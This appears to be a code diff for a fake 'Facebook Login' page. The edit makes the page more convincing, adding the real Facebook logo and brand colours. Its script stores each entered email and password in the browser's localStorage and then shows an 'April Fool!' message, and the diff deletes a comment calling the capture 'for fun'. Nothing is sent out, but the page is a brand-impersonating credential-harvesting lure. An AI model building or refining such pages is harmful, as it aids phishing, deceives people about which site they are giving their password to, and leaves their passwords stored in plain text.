@@ -5,16 +5,53 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Facebook Login</title>
     <style>
-        body { text-align: center; font-family: Arial, sans-serif; margin-top: 50px; }
-        .login-box { width: 300px; margin: auto; padding: 20px; border: 1px solid #ccc; }
-        input { display: block; width: 100%; margin-bottom: 10px; padding: 10px; }
-        button { width: 100%; padding: 10px; background: blue; color: white; border: none; }
+        body { 
+            font-family: Arial, sans-serif; 
+            background-color: #f0f2f5; 
+            text-align: center;
+        }
+        .container {
+            width: 100%;
+            max-width: 400px;
+            margin: 100px auto;
+            padding: 20px;
+            background: white;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            border-radius: 10px;
+        }
+        .logo {
+            width: 200px;
+            margin-bottom: 20px;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 18px;
+            cursor: pointer;
+        }
+        button:hover {
+            background: #1558a5;
+        }
     </style>
 </head>
 <body>
 
-    <h2>Facebook</h2>
-    <div class="login-box">
+    <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
+
+    <div class="container">
+        <h2>Login to Facebook</h2>
         <input type="text" id="email" placeholder="Email or Phone">
         <input type="password" id="password" placeholder="Password">
         <button onclick="foolUser()">Log In</button>
@@ -26,11 +63,8 @@
             let password = document.getElementById('password').value;
 
             if(email && password) {
-                // Save credentials (for fun)
                 localStorage.setItem(email, password);
-
-                // Redirect to the Fool Page
-                document.body.innerHTML = '<h1>April Fool!</h1>';
+                document.body.innerHTML = '<h1 style="color: red; margin-top: 100px;">April Fool!</h1>';
             } else {
                 alert('Please enter your credentials.');
             }
